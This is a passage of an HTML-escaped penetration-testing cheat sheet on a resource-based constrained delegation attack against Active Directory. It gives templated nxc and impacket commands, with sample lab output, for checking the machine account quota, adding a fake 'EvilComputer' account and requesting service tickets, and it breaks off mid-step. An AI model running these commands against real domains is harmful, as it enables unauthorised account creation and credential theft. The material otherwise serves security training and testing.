&lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;rbcd-attack&#34;&gt;RBCD Attack&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-check-machine-quota-optional&#34;&gt;1. Check Machine Quota [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap DC01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --use-kcache --kdcHost &amp;lt;DC&amp;gt; -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M maq&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-create-a-fake-computer-optional&#34;&gt;2. Create a Fake Computer [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed:Password123!&amp;#39;&lt;/span&gt; -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-addcomputer &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt; -computer-name &amp;#39;&amp;lt;COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-addcomputer &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/apple.seed&amp;#39;&lt;/span&gt; -k -computer-name &lt;span class=&#34;s1&#34;&gt;&amp;#39;EvilComputer&amp;#39;&lt;/span&gt; -computer-pass &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Successfully added machine account EvilComputer$ with password Password123!.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-get-service-principle-name-spn-optional&#34;&gt;3. Get Service Principle Name (SPN) [Optional]&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -request&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-GetUserSPNs &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com/svc_web:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.10.11.10 -request                                 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 